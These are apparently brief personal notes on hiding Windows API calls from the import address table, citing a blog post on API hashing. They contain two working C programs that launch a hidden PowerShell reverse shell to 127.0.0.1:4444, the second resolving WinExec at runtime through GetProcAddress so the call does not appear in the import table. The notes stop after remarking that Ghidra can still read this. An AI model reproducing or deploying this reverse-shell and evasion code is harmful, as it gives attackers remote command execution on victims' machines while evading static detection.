# windows api hashing

https://trikkss.github.io/posts/hiding_windows_api_calls_part1/

Windows code for reverse shell
```c
#include <windows.h>

int main(void){
    WinExec("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"", SW_HIDE);
    return 0;

}
```

before a function is used libraries will be loaded in memory and their function addresses will be referenced in the import address table (IAT)

If we look into our import table (I used CFF Explorer to do it) we can see several imported DLLs and our suspicious function (WinExec)

CFF explorere can be used to look at the import address table

first way to fide our function would be to retreive its address at runtime

```c
#include <windows.h>

typedef UINT(WINAPI* winexec)(LPCSTR lpCmdLine, UINT uCmdShow);

int main(void)
{
    // get handle of kernel32.dll
    HMODULE kernel32_dll = GetModuleHandle("kernel32.dll");
    // parse it to find the WinExec function
    winexec WinExec_imported = (winexec)GetProcAddress(kernel32_dll, "WinExec");
    // execute our reverse shell
    WinExec_imported("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"", SW_HIDE);
    return 0;
}

```

but this can be read by ghidra